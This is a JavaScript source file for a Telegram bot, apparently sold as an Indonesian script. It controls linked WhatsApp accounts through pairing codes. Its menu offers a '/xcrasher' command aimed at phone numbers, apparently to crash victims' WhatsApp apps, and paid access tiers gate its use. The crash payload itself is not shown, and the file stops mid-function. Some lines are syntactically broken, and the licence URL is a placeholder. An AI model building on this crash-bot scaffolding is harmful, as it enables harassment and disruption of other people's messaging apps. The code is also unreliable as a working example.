const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWAsocket,
  DisconnectReason,
  generateWAMessageFromContent,
  vGenerateWAMessageFromContent13,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia, 
  MediaType, 
  areJidsSameUser, 
  WAMessageStatus, 
  downloadAndSaveMediaMessage, 
  AuthenticationState, 
  GroupMetadata, 
  initInMemoryKeyStore, 
  getContentType, 
  MiscMessageGenerationOptions, 
  useSingleFileAuthState, 
  BufferJSON, 
  WAMessageProto, 
  MessageOptions, 
  WAFlag, 
  WANode, 
  WAMetric, 
  ChatModification,
  MessageTypeProto, 
  WALocationMessage, 
  ReconnectMode, 
  WAContextInfo, 
  proto, 
  WAGroupMetadata, 
  ProxyAgent, 
  waChatKey, 
  MimetypeMap, 
  MediaPathMap, 
  WAContactMessage, 
  WAContactsArrayMessage, 
  WAGroupInviteMessage, 
  WATextMessage, 
  WAMessageContent, 
  WAMessage, 
  BaileysError, 
  WA_MESSAGE_STATUS_TYPE, 
  MediaConnInfo, 
  URL_REGEX, 
  WAUrlInfo, 
  WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, 
  mentionedJid, 
  processTime, 
  Browser, 
  MessageType, 
  Presence, 
  WA_MESSAGE_STUB_TYPES, 
  Mimetype, 
  relayWAMessage, 
  Browsers, 
  WASocket, 
  getStream, 
  WAProto, 
  isBaileys, 
  AnyMessageContent, 
  fetchLatestBaileysVersion, 
  templateMessage, 
  InteractiveMessage,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const axios = require("axios");


function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}
const crypto = require("crypto");
const path = require("path");
const token = config.BOT_TOKEN;
const chalk = require("chalk");
const bot = new TelegramBot(token, { polling: true });

const startTime = new Date(); 
const StartTimer = Date.now();
function getRuntime() {
  let ms = Date.now() - startTime;
  let seconds = Math.floor(ms / 1000) % 60;
  let minutes = Math.floor(ms / (1000 * 60)) % 60;
  let hours = Math.floor(ms / (1000 * 60 * 60)) % 24;
  let days = Math.floor(ms / (1000 * 60 * 60 * 24));

  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function sendProgressPhoto(chatId, photoPath) {
  const sentPhoto = await bot.sendPhoto(chatId, photoPath, {
    caption: progressStages[0].text,
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise((res) => setTimeout(res, progressStages[i].delay));
    await bot.editMessageCaption(progressStages[i].text, {
      chat_id: chatId,
      message_id: sentPhoto.message_id,
    });
  }

  return sentPhoto;
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const danzy = makeWAsocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          danzy.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, danzy);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          danzy.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

const GITHUB_RAW_URL =
  "𝐋𝐢𝐧𝐤 𝐆𝐢𝐭𝐡𝐮𝐛";

async function checkTokenInGitHub(tokenToCheck) {
  try {
    const response = await axios.get(GITHUB_RAW_URL);

    let tokensData;
    try {
      if (typeof response.data === "object") {
        tokensData = response.data;
      } else {
        tokensData = JSON.parse(response.data);
      }
    } catch (parseError) {
      console.error("Error parsing data:", parseError);
      return false;
    }

    if (!tokensData.tokens) {
      return false;
    }

    const isTokenValid = tokensData.tokens.includes(tokenToCheck);

    return isTokenValid;
  } catch (error) {
    console.error("Error checking token");
    return false;
  }
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
=====[ 𝐌𝐞𝐦𝐮𝐥𝐚𝐢 ]=====
| Bot: ${botNumber}
| Status: Inisialisasi...
==========================`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const danzy = makeWAsocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  danzy.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
=====[ 𝐑𝐞𝐜𝐨𝐧𝐧𝐞𝐜𝐭]=====
| Bot: ${botNumber}
| Status: Mencoba menghubungkan...
==============================`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
=====[ 𝐆𝐚𝐠𝐚𝐥 ]=====
| Bot: ${botNumber}
| Status: Tidak dapat terhubung
======================`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {}
      }
    } else if (connection === "open") {
      sessions.set(botNumber, danzy);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
=====[ 𝐓𝐞𝐫𝐡𝐮𝐛𝐮𝐧𝐠 ]=====
| Bot: ${botNumber}
| Status: Berhasil terhubung!
==============================`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await danzy.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
=====[ 𝐘𝐨𝐮𝐫 𝐂𝐨𝐝𝐞 ]=====
| Bot : ${botNumber}
| Kode : ${formattedCode}
| Durasi : 60 Detik / 1 Menit 
=============================`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        await bot.editMessageText(
          `
=====[ 𝐄𝐫𝐨𝐫 ]=====
| Bot : ${botNumber}
| Pesan : ${error.message}
=====================`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  danzy.ev.on("creds.update", saveCreds);

  return danzy;
}

async function initializeBot() {
  const isValidToken = await checkTokenInGitHub(token);
  if (!isValidToken) {
    console.log(chalk.bold.red("𝐌𝐚𝐚𝐟 𝐓𝐨𝐤𝐞𝐧 𝐀𝐧𝐝𝐚 𝐓𝐢𝐝𝐚𝐤 𝐓𝐞𝐫𝐝𝐚𝐟𝐭𝐚𝐫 𝐃𝐢 𝐃𝐚𝐥𝐚𝐦 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 𝐇𝐮𝐛𝐮𝐧𝐠𝐢 : @FyyXonNReal"));
    process.exit(1);
  }

  console.log(`
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣟⢿⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢿⣿⣿⡿⣩⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠻⣿⣿⣿⣿⣿⣷⣯⣽⣟⡿⢿⣷⣭⣟⡿⢿⣿⣿⣿⣧⡁⢻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠙⢻⣿⣿⢟⡥⣢⣾⠟⣡⡾⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣄⢸⡟⠉⣿⣿⣿⣿⣿⣿⣿⣷⣾⣽⣻⢿⣷⣾⣽⣿⣿⣿⡍⠻⢿⣿⣿⣿⣿⣿⣿⣿⣧⢢⠉⣱⢟⣴⢟⣵⡿⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡌⢠⡆⢻⣿⢋⣛⡻⣿⡿⣿⣿⣿⣿⣿⣾⣭⣛⣿⣿⣿⣷⠹⣦⣙⠻⢿⣿⣿⣿⣿⣿⢣⢿⣇⢛⣵⡿⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣇⣸⣿⢸⣿⠀⢿⣿⣿⣀⢹⡟⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡟⠉⠑⠚⠛⠛⠛⠛⠁⠓⠷⠾⠿⠿⢤⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣤⡿⠰⣶⣬⡇⣿⢸⣇⡏⣿⣿⢿⣿⣿⣿⡿⠛⠛⣉⠠⠄⠒⠈⠁⠉⠈⠁⠉⠈⠀⠂⠐⠀⠀⠤⢈⠉⡛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣶⣦⣭⣁⣿⠘⣸⡇⣿⣿⢹⡿⠟⠉⠀⠐⠁⣀⠠⢄⢢⠒⡬⠱⡩⢜⡡⢋⠵⡉⢦⡑⢢⠄⡤⢀⠀⠁⠄⡉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣯⡘⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣇⣿⠟⠊⠀⢀⠠⡐⢬⡑⢢⠍⢎⠴⣉⠲⣡⠓⣌⠒⣍⢢⡙⠤⢊⠥⠚⠤⢃⠎⡥⢂⡀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⡇⠈⠿⠿⠿⠿⢿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⢀⢄⡃⢇⠻⣀⠜⡣⢜⡸⢄⡃⢧⠀⠟⠀⠛⠀⣀⣀⣀⣀⣀⡠⣄⣀⣀⣀⣀⠃⠠⠀⠀⠘⣿⣿⣿⣿⣿⠟⣃⣠⡄⢃⣠⣼⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⡀⢆⢣⢊⡜⠬⡱⢌⡊⡕⠢⠑⠊⣈⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣦⡻⣿⣿⣿⣿⣿⣶⣄⠀⠈⠻⣿⣿⣥⣤⣬⡅⡇⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⡰⡘⡌⢆⠣⢜⢢⡑⠎⢐⣠⣴⣾⢧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣻⣿⣿⣿⣿⣿⣿⣿⡟⢷⡀⠀⠘⣿⣿⣿⣿⣿⡀⣿⣿⣿⣿⣿⣏
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⢠⠒⡴⠑⡜⡌⠳⠈⢂⣤⣾⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣯⡙⣿⣿⣿⣧⢻⣿⣿⡿⣿⣿⣿⣿⣿⣎⢿⡀⠀⠸⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢠⠃⡭⢰⡉⠦⠉⣠⣾⣿⣿⣿⡿⣵⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡠⣙⢿⣿⣇⠻⣿⡷⢹⣿⣿⣿⣿⣿⡌⣧⢂⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢢⠙⡰⠃⠈⡄⣾⢯⣿⣿⣿⣿⠇⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣇⠙⣿⣷⢻⣧⡝⢛⣈⣄⠾⣇⢿⣿⣿⣿⣿⣿⡸⣼⡆⢻⣿⣿⣿⣿⣟⢿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠠⢋⡔⠁⣾⣸⣿⢸⣿⡿⢹⣿⣷⢹⣿⣷⢸⣿⣿⣿⣿⣿⣿⣿⣼⡮⠛⢨⣷⣾⡯⠀⠛⠁⠉⡘⣿⣿⣿⣿⣿⣧⠙⠛⠈⢿⣿⣿⣿⣿⣿⣯⣛⣿⣿
⣿⣿⣿⣿⣿⣏⠙⠿⢟⡳⡄⠐⠀⢸⡇⣿⣷⡸⣿⡇⢸⣿⣿⢠⠻⣿⠘⣿⣿⣿⣿⣿⣿⣿⣰⡚⠀⠈⠉⠁⠀⡀⠀⢿⣿⣷⢹⣿⣿⣿⣿⣿⡎⢫⠀⠈⣿⣿⣿⣿⣽⣻⠿⣿⣮
⣿⣿⣿⣿⣿⣿⡧⢡⣌⢼⣿⢆⡀⣺⢹⣿⣿⡇⢻⡧⠧⠹⢛⠉⣣⡉⠀⣬⡻⣿⣿⢿⣿⣿⢹⣷⡆⢀⠐⠈⡐⢠⠤⠘⣿⣿⡆⣿⣿⣿⣿⣿⣿⡸⠀⣇⢹⣿⣿⣿⣿⣿⣿⣿⣯
⣿⣿⣿⣿⣿⠟⡵⣣⡻⣎⣵⣿⠁⡇⣾⣿⣿⣧⣆⠒⢻⣿⣢⡤⠛⠃⠀⠉⣿⣮⣙⣠⣝⣋⣸⣿⣿⠀⡌⡓⣌⠣⡜⢠⣿⠿⠧⢸⣿⣿⣿⣿⣿⣇⠀⣿⡆⢻⣿⣿⣿⣿⣿⣿⣿
⣹⣿⣿⣿⣫⢞⣵⣿⢇⣼⣿⣿⠀⣧⣹⣿⣿⠇⣿⠶⠚⠉⠀⠀⠀⡀⠄⡀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⣁⠈⢡⣔⠫⠵⣞⣒⠈⣿⣿⣿⣿⣿⣿⡀⣿⣇⠈⢿⣿⣿⣻⣿⣿⣿
⣿⣿⡟⡕⣱⣿⣿⣣⡾⣫⣄⢹⠃⣿⣿⣿⣿⡇⢿⣤⣶⣿⡇⠀⢁⡠⢄⡒⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣫⣥⡮⠍⢶⠿⢟⣻⣭⡆⢻⣿⣿⣿⣿⣿⣧⢹⣧⢳⠈⣿⣿⣿⣿⣿⣷
⣿⠏⣠⣾⣿⡟⡵⣫⣾⣿⣿⣿⡇⢻⣿⡽⣿⡇⢸⣿⣿⣿⣷⠈⢆⡱⢊⠔⣠⣿⣿⣿⣿⣿⣿⡿⣟⡋⣥⣶⣷⢳⡈⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⡈⡇⣿⣇⢸⣿⣿⣿⣿⣽
⢃⣴⣿⣿⠋⣨⣾⣿⣿⣿⣿⣿⡇⢸⣿⢸⣿⡧⠈⣿⣿⣿⣿⣦⡤⡄⠶⣾⣿⣿⣿⠿⣛⣩⣷⣿⣿⣿⣹⣿⣿⡏⠇⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⡇⢡⣿⣿⠀⣿⣿⣿⣿⣿
⣾⣿⣟⣡⣾⣿⣿⣿⣿⣿⣿⣿⣇⠈⣿⢸⣿⣷⢀⢸⡿⠟⣉⣲⣭⣿⡿⠘⣋⣭⡾⣿⣿⣧⢿⣿⣿⣿⣏⢿⣿⣿⢂⣿⣿⣿⡿⢁⣿⠏⣼⣿⣿⣿⣿⢻⡸⣿⡿⠀⣹⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⡆⠛⣼⣿⣿⢸⠀⣶⠿⣛⡯⢕⣫⣾⡇⣿⣿⣧⢿⣿⣿⡾⣿⣿⣿⣿⣞⢿⢏⣾⣿⠟⠋⢀⣪⠅⣾⣿⣿⣿⣿⣿⢸⡇⠋⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⡄⣿⣿⣿⣿⣿⣿⣿⣿⢸⣷⠀⣿⣿⣿⢸⡇⢲⣶⣶⣾⣿⣿⣿⣷⠈⣿⣿⣼⣿⣿⣷⢻⣿⣿⣿⡟⢢⣿⣿⣿⣶⣿⡟⠑⠂⣿⣿⣿⣿⣿⡟⢸⡇⢰⢸⢰⣿⣿⣿⣿⣿
⣿⣿⣿⡇⠌⢿⣿⣿⣿⣿⣿⡏⣼⣿⠇⣿⣿⣿⠸⣇⠸⣿⣿⣿⣿⣿⣿⣿⣷⣬⣙⠇⠻⠿⠿⠶⢟⣛⣥⣴⣿⣿⣿⣿⠟⠁⡼⠃⣼⣿⡿⠿⠟⣋⣤⢺⡇⠋⢣⢸⣿⣿⣿⣿⣿
⣿⠿⢋⣡⣼⣠⠭⢍⣡⣼⣿⢡⣿⡏⢰⣿⣿⣿⡆⣿⡀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢛⣵⡇⢸⣷⣶⡶⢖⣴⡾⣿⣿⣿⠀⠇⢎⠇⣾⣿⣿⣿⣿⣿
⣷⣶⣶⣶⠰⡇⣾⣿⣿⣿⢇⡾⢋⢰⣿⣿⣿⣿⡇⢿⣿⣿⡆⢠⣄⢩⣙⣛⠛⠿⠿⠿⠿⣿⣿⣿⣿⣿⠿⠛⣩⣶⣿⣿⣷⠸⣿⣯⣴⡿⣫⣾⣿⡿⠋⠀⠀⠀⣰⣿⣿⣿⣿⣿⢩
⣿⣿⣿⣿⣇⠃⣿⣿⣿⠋⣀⣴⣿⢸⣿⣿⣿⡟⣁⣸⣿⡏⡷⢸⣿⣷⣮⣭⢉⣡⣾⣶⣷⡶⠂⠀⣶⠶⠶⠛⠛⠋⠉⠉⠁⠀⠙⠻⢏⣾⣿⣿⡇⡀⠀⠀⠒⠛⠻⠿⣿⣿⣿⣿⡈
⣿⣿⣿⣿⣿⣤⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⢏⣼⣿⣿⠟⠁⠁⣼⣿⣿⠟⣡⣿⣿⣿⡿⣋⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡟⣱⣿⣷⣄⠀⠀⠀⠀⠀⠙⣿⣿⣷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⡲⠌⣿⠏⠾⢟⣫⡵⢂⣄⣀⡝⣿⣧⣾⣿⡿⠟⣡⣾⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣷⣿⠿⣿⣿⡆⠀⠀⠀⠀⠀⠈⠻⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⣰⣿⣿⣿⠀⢺⣿⣿⣿⢹⣿⣿⢉⣠⣾⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⠟⣱⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠘
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣷⡄⠙⠻⣿⡇⢿⠿⣛⣥⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⠟⡋⣴⠿⠟⣡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

‹⧼ 𝐓𝐨𝐤𝐞𝐧 𝐀𝐧𝐝𝐚 𝐓𝐞𝐫𝐝𝐚𝐟𝐭𝐚𝐫 𝐃𝐢 𝐃𝐚𝐥𝐚𝐦 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞! ⧽›
‹⧼ 𝐀𝐜𝐜𝐞𝐬 𝐀𝐜𝐜𝐞𝐩𝐭𝐞𝐝✅ ⧽›
‹⧼ 𝐍𝐨𝐭𝐞 : 𝐓𝐪 𝐅𝐨𝐫 𝐁𝐮𝐲𝐲𝐢𝐧𝐠 𝐒𝐜𝐫𝐢𝐩𝐭 ⧽›
=========================================`);

  await initializeWhatsAppConnections();
}

initializeBot();
//==========[ F I N A L - C O N N E C T ]==========\\

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

//==========[ C A S E - F I T U R ]==========\\
bot.onText(/\/𝚛𝚎𝚡/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendPhoto(chatId, fs.createReadStream("./assets/menu.png"), {
    caption: `
\`\`\`
(   𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈   ) 
Developer : RexXx
Name Bot : 𝐒𝐮𝐩𝐞𝐫𝐙
Version : 𝟏.𝟐
Session : ${sessions.size} 
Runtime : ${getRuntime()}
Tanggal : ${new Date().toLocaleString("en-GB", { timeZone: "Asia/Jakarta" })}

\`\`\`
©𝗥𝗲𝘅𝗫𝘅𝗠
    `.trim(),
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝚂𝚑𝚘𝚠 𝙲𝚑𝚊𝚗𝚗𝚎𝚕", url: "https://t.me/" }],
        [
          { text: "𝚂𝚑𝚘𝚠 𝙱𝚞𝚐", callback_data: "bug_menu" },
          { text: "𝚂𝚑𝚘𝚠 𝙾𝚠𝚗𝚎𝚛", callback_data: "owner_menu" },
        ],
      ],
    },
  });
});
bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;

  await bot.answerCallbackQuery(callbackQuery.id);

  if (data === "bug_menu") {
    await bot.editMessageCaption(
      `\`\`\`
=====(  𝗠𝗲𝗻𝘂 𝗕𝘂𝗴  )=======
- /xcrasher 62xxx
\`\`\`
©𝗥𝐞𝐱𝐗𝐲`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "‹ 𝕭𝖆𝖈𝖐", callback_data: "start_menu" }]],
        },
      }
    );
  } else if (data === "owner_menu") {
    await bot.editMessageCaption(
      `\`\`\`
(  𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂  )
- /addsender 62xx
- /listbot
- /statusbot
- /cooldown 1m
- /addprem <id>
- /delprem <id>
- /addsupervip <id>
- /delsupervip <id>
\`\`\`
©𝗥𝐞𝐱𝐗𝐲`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "‹ Back To Menu", callback_data: "start_menu" }]],
        },
      }
    );
  } else if (data === "start_menu") {
    await bot.editMessageCaption(
      `\`\`\`
(  𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜  )
Developer : 𝐑𝐞𝐱𝐗𝐲 𝐈𝐬 𝐇𝐞𝐫𝐞! 
Name Bot : 𝐒𝐮𝐩𝐩𝐞𝐫𝐙
Version : 𝟏.𝟐
Session : ${sessions.size} 
Runtime : ${getRuntime()}
Tanggal : ${new Date().toLocaleString("en-GB", { timeZone: "Asia/Jakarta" })}

\`\`\`
©𝗥𝗲𝘅𝗫𝘅𝗠`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝚂𝚑𝚘𝚠 𝙲𝚑𝚊𝚗𝚗𝚎𝚕", url: "https://t.me/FyyXonNReal" }],
            [
              { text: "𝚂𝚑𝚘𝚠 𝙱𝚞𝚐", callback_data: "bug_menu" },
              { text: "𝚂𝚑𝚘𝚠 𝙾𝚠𝚗𝚎𝚛", callback_data: "owner_menu" },
            ],
          ],
        },
      }
    );
  }
});
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});

const supervipFile = path.resolve("./supervip.js");
let supervipUsers = require("./supervip.js");

function isSupervip(userId) {
  return supervipUsers.includes(userId.toString());
}

let cooldownEnabled = true;
const cooldowns = new Map();
let COOLDOWN_TIME = 80 * 1000; // default awal

bot.onText(/\/cooldown(?: (\w+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const arg = match[1];

  if (!arg) {
    return bot.sendMessage(chatId, "⚠️ Format salah. Contoh: `/cooldown off`, `/cooldown 2m`, `/cooldown 30s`", {
      parse_mode: "Markdown",
    });
  }

  if (arg === "on") {
    cooldownEnabled = true;
    return bot.sendMessage(chatId, "✅ Cooldown *diaktifkan*", { parse_mode: "Markdown" });
  }

  if (arg === "off") {
    cooldownEnabled = false;
    return bot.sendMessage(chatId, "❌ Cooldown *dinonaktifkan*", { parse_mode: "Markdown" });
  }

  // Jika argumen berupa waktu (misal 2m atau 30s)
  const matchTime = arg.match(/^(\d+)(s|m)$/);
  if (matchTime) {
    const value = parseInt(matchTime[1]);
    const unit = matchTime[2];

    COOLDOWN_TIME = unit === "m" ? value * 60 * 1000 : value * 1000;

    return bot.sendMessage(
      chatId,
      `⏱️ Cooldown diatur ke *${value}${unit === "m" ? " menit" : " detik"}*`,
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⚠️ Format waktu tidak dikenali. Gunakan seperti: `/cooldown 90s`, `/cooldown 2m`", {
    parse_mode: "Markdown",
  });
});


bot.onText(/\/statusbot/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isSupervip(userId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan perintah ini.",
      { parse_mode: "MarkdownV2" }
    );
  }

  // Cooldown check
  if (cooldownEnabled) {
    const lastUsed = cooldowns.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < COOLDOWN_TIME) {
      const remaining = COOLDOWN_TIME - (now - lastUsed);
      const seconds = Math.ceil(remaining / 1000);
      const minutes = Math.floor(seconds / 60);
      const secs = seconds % 60;
      const timeStr = minutes > 0 ? `${minutes}m ${secs}s` : `${secs}s`;

      return bot.sendMessage(chatId, `⏳ Harap tunggu *${timeStr}* sebelum menggunakan perintah ini lagi.`, {
        parse_mode: "Markdown"
      });
    }

    cooldowns.set(userId, now);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Tidak ada bot WhatsApp yang terhubung*\.\nSilakan hubungkan bot terlebih dahulu dengan perintah /addsender\.",
        { parse_mode: "MarkdownV2" }
      );
    }

    // Tambahkan status cooldown
    let cooldownStatus = "Cooldown: Tidak Aktif";
    if (cooldownEnabled) {
      const seconds = Math.floor(COOLDOWN_TIME / 1000);
      const minutes = Math.floor(seconds / 60);
      const secs = seconds % 60;
      const timeStr = minutes > 0 ? `${minutes}m ${secs}s` : `${secs}s`;
      cooldownStatus = `Cooldown: Aktif \${timeStr}\`; // Escape () untuk MarkdownV2
    }

    let botList = "```Danzy\n======[ STATUS BOT ]======\n";
    botList += `| ${cooldownStatus}\n|\n`;

    for (const [botNumber, danzy] of sessions.entries()) {
      const status = danzy.user ? "Status: Terhubung" : "Status: Tidak Terhubung";
      const maskedNumber =
        botNumber.length >= 8
          ? botNumber.slice(0, 2) + "*****" + botNumber.slice(-2)
          : botNumber;

      botList += `| - ${maskedNumber}\n|   ${status}\n`;
    }

    botList += `|\n| Total: ${sessions.size} bot\n========================\n\`\`\``;

    await bot.sendMessage(chatId, botList, { parse_mode: "MarkdownV2" });
  } catch (error) {
    console.error("Error in statusbot:", error);
    await bot.sendMessage(
      chatId,
      "⚠️ Terjadi kesalahan saat mengambil status bot\\. Silakan coba lagi\\.",
      { parse_mode: "MarkdownV2" }
    );
  }
});

bot.onText(/\/addsupervip (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nHanya pemilik bot yang dapat menambah pengguna supervip.",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

